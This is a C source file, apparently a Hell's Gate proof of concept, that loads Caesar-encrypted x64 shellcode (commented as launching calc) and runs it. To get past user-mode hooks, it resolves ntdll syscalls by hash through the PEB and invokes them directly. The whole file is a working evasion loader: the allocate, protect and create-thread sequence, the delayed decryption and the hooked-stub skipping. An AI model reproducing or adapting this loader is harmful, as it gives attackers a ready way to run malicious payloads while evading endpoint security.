#pragma once
#include <Windows.h>
#include "structs.h"

#include <stdio.h>

// calc x64 thread exit 
unsigned char shellcode[] = "\x31\x7d\xb8\x19\x25\x1d\x01\x35\x35\x35\x76\x86\x76\x85\x87\x86\x7d\x66\x07\x9a\x7d\xc0\x87\x95\x7d\xc0\x87\x4d\x7d\xc0\x87\x55\x8b\x82\x66\xfe\x7d\xc0\xa7\x85\x7d\x44\xec\x7f\x7f\x7d\x66\xf5\xe1\x71\x96\xb1\x37\x61\x55\x76\xf6\xfe\x42\x76\x36\xf6\x17\x22\x87\x76\x86\x7d\xc0\x87\x55\xc0\x77\x71\x7d\x36\x05\x9b\xb6\xad\x4d\x40\x37\x44\xba\xa7\x35\x35\x35\xc0\xb5\xbd\x35\x35\x35\x7d\xba\xf5\xa9\x9c\x7d\x36\x05\xc0\x7d\x4d\x79\xc0\x75\x55\x7e\x36\x05\x85\x18\x8b\x82\x66\xfe\x7d\x34\xfe\x76\xc0\x69\xbd\x7d\x36\x0b\x7d\x66\xf5\xe1\x76\xf6\xfe\x42\x76\x36\xf6\x6d\x15\xaa\x26\x81\x38\x81\x59\x3d\x7a\x6e\x06\xaa\x0d\x8d\x79\xc0\x75\x59\x7e\x36\x05\x9b\x76\xc0\x41\x7d\x79\xc0\x75\x51\x7e\x36\x05\x76\xc0\x39\xbd\x7d\x36\x05\x76\x8d\x76\x8d\x93\x8e\x8f\x76\x8d\x76\x8e\x76\x8f\x7d\xb8\x21\x55\x76\x87\x34\x15\x8d\x76\x8e\x8f\x7d\xc0\x47\x1e\x80\x34\x34\x34\x92\x7e\xf3\xac\xa8\x67\x94\x68\x67\x35\x35\x76\x8b\x7e\xbe\x1b\x7d\xb6\x21\xd5\x36\x35\x35\x7e\xbe\x1a\x7e\xf1\x37\x35\x35\x85\x3f\x3f\x40\xba\x76\x89\x7e\xbe\x19\x81\xbe\x26\x76\xef\x81\xac\x5b\x3c\x34\x0a\x81\xbe\x1f\x9d\x36\x36\x35\x35\x8e\x76\xef\x5e\xb5\xa0\x35\x34\x0a\x9f\x3f\x76\x93\x85\x85\x82\x66\xfe\x82\x66\xf5\x7d\x34\xf5\x7d\xbe\xf7\x7d\x34\xf5\x7d\xbe\xf6\x76\xef\x1f\x44\x14\x15\x34\x0a\x7d\xbe\xfc\x9f\x45\x76\x8d\x81\xbe\x17\x7d\xbe\x2e\x76\xef\xce\xda\xa9\x96\x34\x0a\xba\xf5\xa9\x3f\x7e\x34\x03\xaa\x1a\x1d\xc8\x35\x35\x35\x7d\xb8\x21\x45\x7d\xbe\x17\x82\x66\xfe\x9f\x39\x76\x8d\x7d\xbe\x2e\x76\xef\x37\x0e\xfd\x94\x34\x0a\xb8\x2d\x35\xb3\x8a\x7d\xb8\xf9\x55\x93\xbe\x2b\x9f\x75\x76\x8e\x9d\x35\x45\x35\x35\x76\x8d\x7d\xbe\x27\x7d\x66\xfe\x76\xef\x8d\xd9\x88\x1a\x34\x0a\x7d\xbe\xf8\x7e\xbe\xfc\x82\x66\xfe\x7e\xbe\x25\x7d\xbe\x0f\x7d\xbe\x2e\x76\xef\x37\x0e\xfd\x94\x34\x0a\xb8\x2d\x35\xb2\x5d\x8d\x76\x8c\x8e\x9d\x35\x75\x35\x35\x76\x8d\x9f\x35\x8f\x76\xef\x40\x64\x44\x65\x34\x0a\x8c\x8e\x76\xef\xaa\xa3\x82\x96\x34\x0a\x7e\x34\x03\x1e\x71\x34\x34\x34\x7d\x36\xf8\x7d\x5e\xfb\x7d\xba\x2b\xaa\xe9\x76\x34\x1c\x8d\x9f\x35\x8e\xf0\x15\x52\x5f\x3f\x76\xbe\x0f\x34\x0a\x35";

/*--------------------------------------------------------------------
  VX Tables
--------------------------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, * PVX_TABLE;

/*--------------------------------------------------------------------
  Function prototypes.
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PVX_TABLE_ENTRY pVxTableEntry
);
BOOL Payload(
	_In_ PVX_TABLE pVxTable
);
PVOID VxMoveMemory(
	_Inout_ PVOID dest,
	_In_    const PVOID src,
	_In_    SIZE_T len
);

/*--------------------------------------------------------------------
  External functions' prototype.
--------------------------------------------------------------------*/
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

INT wmain() {
//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;

	VX_TABLE Table = { 0 };
	
	//__debugbreak();
	
	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
		return 0x1;

	Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
		return 0x1;

	Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
		return 0x1;

	Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
		return 0x1;

	wprintf(L"[*] Address of VX_Table [ %p ]\n", &Table);
	
	EnterHell(&Table);
	return 0x00;
}

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}

BOOL EnterHell(PVX_TABLE pVxTable) {
	NTSTATUS status = 0x00000000;
	//char shellcode[] = "\x90\x90\x90\x90\xcc\xcc\xcc\xcc\xc3";

	// user32.dll needs to be loaded into the process to use MessageBox() function
	//HANDLE u32 = LoadLibraryA("User32.dll");

	wprintf(L"[*] vx_tab -> [ %p ] \n\t| Hells Gate -> [ %p ] \n\t| Hell Descent -> [ %p ]\n", pVxTable, HellsGate, HellDescent);

	// Allocate memory for the shellcode
	PVOID lpAddress = NULL;
	SIZE_T sDataSize = sizeof(shellcode);
	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

	wprintf(L"[*] Shellcode address -> [ %p ]\n\t| Shellcode memory address -> [ %p ]\n", shellcode, lpAddress);
	
	//Ceasar decrypt
	for (int i = 0; i < sizeof(shellcode); i++) {
		// with sleep should result in ~25 seconds
		Sleep(50);
		shellcode[i] = (unsigned char)(((unsigned int)shellcode[i] - 53) & 0xFF);
	}

	// Write Memory
	//VxMoveMemory(lpAddress, shellcode, sizeof(shellcode));
	VxMoveMemory(lpAddress, shellcode, sizeof(shellcode));

	// Change page permissions
	ULONG ulOldProtect = 0;
	HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

	// Create thread
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
	status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	LARGE_INTEGER Timeout;
	//Timeout.QuadPart = -1000000000000; // Wait for 1 seconds
	Timeout.HighPart = 0xFFFFFFFFFFFF; // Wait infinitely (until thread is killed)
	HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
	status = HellDescent(hHostThread, FALSE, &Timeout);

	return TRUE;
}

// Function to move memory similar to memmove 
PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}